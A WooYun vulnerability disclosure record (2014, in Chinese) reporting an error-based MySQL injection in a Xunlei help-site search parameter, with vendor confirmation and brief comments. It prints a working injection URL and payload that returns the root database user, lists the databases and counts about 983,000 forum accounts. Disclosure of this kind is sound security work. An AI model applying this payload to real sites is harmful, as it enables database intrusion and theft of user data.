{"id": 47233, "wybug_id": "wooyun-2014-087559", "wybug_title": "迅雷分站MySQL报错注入(root权限)98万BBS用户信息", "wybug_corp": "迅雷", "wybug_author": "lijiejie", "wybug_date": "2014-12-17 17:45", "wybug_open_date": "2015-01-31 17:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "14", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-31：\t细节向公众公开  简要描述： 迅雷分站MySQL报错注入(root权限),98万BBS用户信息 详细说明：  注入点：\ndynamic.help.xunlei.com/getArticlesBySearch.do?callback=jsonp1418799470192&searchstr=aaaa&_=1418799470273\n参数searchstr可注入。 SQL查询可报错。   漏洞证明：  \ndynamic.help.xunlei.com/getArticlesBySearch.do?callback=jsonp1418799470192&searchstr='and(select 1 from(select count(*),concat((select concat(0x5e5e5e,user(),0x5e5e5e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and'&_=1418799470273\n得到user()：\nroot@127.0.0.1\n\n\n当前库：   xlhelp2所有库：\n[*] bbs[*] cued[*] expire_msg_stat[*] gbbs[*] information_schema[*] kk_stat[*] lightmagic[*] mysql[*] offlinemsg_0[*] offlinemsg_1[*] offlinemsg_2[*] offlinemsg_3[*] offlinemsg_4[*] offlinemsg_5[*] offlinemsg_6[*] offlinemsg_7[*] offlinemsg_8[*] offlinemsg_9[*] question[*] stat_cnc[*] stat_dc_cnc[*] stat_dc_tel[*] stat_tele[*] test[*] uc[*] user_0[*] user_1[*] user_10[*] user_11[*] user_12[*] user_13[*] user_14[*] user_15[*] user_16[*] user_17[*] user_18[*] user_19[*] user_2[*] user_20[*] user_21[*] user_22[*] user_23[*] user_24[*] user_25[*] user_26[*] user_27[*] user_28[*] user_29[*] user_3[*] user_30[*] user_31[*] user_32[*] user_33[*] user_34[*] user_35[*] user_36[*] user_37[*] user_38[*] user_39[*] user_4[*] user_40[*] user_41[*] user_42[*] user_43[*] user_44[*] user_45[*] user_46[*] user_47[*] user_48[*] user_49[*] user_5[*] user_50[*] user_51[*] user_52[*] user_53[*] user_54[*] user_55[*] user_56[*] user_57[*] user_58[*] user_59[*] user_6[*] user_60[*] user_61[*] user_62[*] user_63[*] user_64[*] user_65[*] user_66[*] user_67[*] user_68[*] user_69[*] user_7[*] user_70[*] user_71[*] user_72[*] user_73[*] user_74[*] user_75[*] user_76[*] user_77[*] user_78[*] user_79[*] user_8[*] user_80[*] user_81[*] user_82[*] user_83[*] user_84[*] user_85[*] user_86[*] user_87[*] user_88[*] user_89[*] user_9[*] user_90[*] user_91[*] user_92[*] user_93[*] user_94[*] user_95[*] user_96[*] user_97[*] user_98[*] user_99[*] xlcidmb[*] xlcs[*] xldc[*] xlhelp[*] xlhelp2[*] xlkeyword\nbbs库账号98万枚：\nDatabase: bbs+------------+---------+| Table      | Entries |+------------+---------+| pw_members | 983467  |+------------+---------+\n其他的几个库没仔细看，但是user分了100个库，到底有多少用户数据，我未计算。   修复方案：  参数过滤   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-12-18 15:36 厂商回复： 属于迅雷客服应用及客户服务数据。根据迅雷风险评估定级标准，等级定为中。 最新状态： 2014-12-18：请漏洞作者邮件联系 我爱乌云xunlei.com 获取奖励。 2014-12-18：邮箱地址被系统替换了。 是 security at xunlei.com  ", "replys": "漏洞评价：\n评论\n     2014-12-17 18:10 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  好厉害    \n     2014-12-17 21:45 |    \t\tFire ant \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:26        | 他们回来了................)\t\t \n  在线等    \n     2014-12-18 00:46 |    \t\tnextdoor \t\t\t( 普通白帽子  |\t\t\t        Rank:325 漏洞数:74        )\t\t \n  神器    \n     2014-12-18 16:46 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  2014-12-18：请漏洞作者邮件联系 我爱乌云xunlei.com 获取奖励。2014-12-18：邮箱地址被系统替换了。 是 security at xunlei.com    \n     2014-12-18 17:22 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  好厉害    \n     2015-02-01 23:26 |    \t\tonpu \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:19        | 静坐常思己过，闲谈莫论人非)\t\t \n  估计礼物是一个月会员。。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}